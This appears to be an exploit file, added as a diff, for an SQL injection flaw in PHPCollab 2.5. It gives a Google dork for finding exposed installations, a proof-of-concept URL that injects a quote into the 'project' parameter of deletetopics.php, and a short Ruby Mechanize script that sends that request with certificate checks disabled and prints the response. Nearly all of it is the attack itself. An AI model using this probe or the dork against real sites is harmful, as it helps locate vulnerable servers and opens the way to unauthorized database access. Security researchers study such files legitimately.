@@ -1,0 +1,26 @@
+# Exploit Title: PHPCollab 2.5 - SQL Injection
+# Google Dork: filetype:php inurl:"/general/login.php?PHPSESSID="
+# Date: 13/05/2015
+# Exploit Author: Wad Deek
+# Vendor Homepage: http://www.phpcollab.com/
+# Software Link: http://sourceforge.net/projects/phpcollab/files/final/2.5/
+# Version: 2.5
++>2.5<+ --> /docs/changes.txt
++>2.5<+ --> /docs/readme.txt
+# Tested on: Xampp on Windows7
+###################################################################################
+PoC = http://127.0.0.1/phpcollab/topics/deletetopics.php?project=%27
+###################################################################################
+#=====================================================
+require('mechanize')
+agent = Mechanize.new()
+agent.redirect_ok = false
+agent.verify_mode = OpenSSL::SSL::VERIFY_NONE
+#=====================================================
+begin
+html = agent.get("http://127.0.0.1/phpcollab/topics/deletetopics.php?project=%27")
+rescue
+else
+puts(html.body())
+end
+#=====================================================
